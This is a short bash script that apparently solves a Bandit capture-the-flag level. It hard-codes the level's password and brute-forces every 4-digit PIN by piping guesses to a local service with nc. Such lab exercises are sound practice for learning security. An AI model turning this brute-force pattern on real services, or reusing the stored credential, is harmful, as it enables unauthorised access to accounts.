#!/bin/bash

# Bandit24's password
password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Loop through all possible 4-digit pins
for pin in {0000..9999}; do
    echo "$password $pin" 
done | nc localhost 30002